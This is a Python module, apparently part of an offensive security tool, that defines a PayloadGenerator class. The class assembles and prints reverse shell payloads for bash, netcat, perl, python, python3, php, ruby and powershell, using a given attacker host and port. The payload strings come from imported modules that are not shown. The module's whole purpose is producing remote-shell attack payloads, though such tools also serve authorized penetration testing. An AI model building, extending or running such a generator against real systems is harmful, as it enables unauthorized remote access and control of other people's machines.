"""Generate all reverse shell payloads"""

from . import bash_payloads, python_payloads, windows_payloads

class PayloadGenerator:
    """Generate reverse shell payloads for multiple platforms"""
    
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    
    def generate_all_payloads(self):
        """Generate all available payloads"""
        payloads = {
            'bash': bash_payloads.generate_bash_payload(self.lhost, self.lport),
            'netcat': bash_payloads.generate_netcat_payload(self.lhost, self.lport),
            'perl': bash_payloads.generate_perl_payload(self.lhost, self.lport),
            'python': python_payloads.generate_python_payload(self.lhost, self.lport),
            'python3': python_payloads.generate_python3_payload(self.lhost, self.lport),
            'php': python_payloads.generate_php_payload(self.lhost, self.lport),
            'ruby': python_payloads.generate_ruby_payload(self.lhost, self.lport),
            'powershell': windows_payloads.generate_powershell_payload(self.lhost, self.lport)
        }
        return payloads
    
    def print_payloads(self):
        """Print all available payloads"""
        payloads = self.generate_all_payloads()
        
        print("\n" + "=" * 60)
        print("REVERSE SHELL PAYLOADS")
        print("=" * 60 + "\n")
        
        for name, payload in payloads.items():
            print(f"[{name.upper()}]")
            print(f"{payload}\n")
        
        print("=" * 60 + "\n")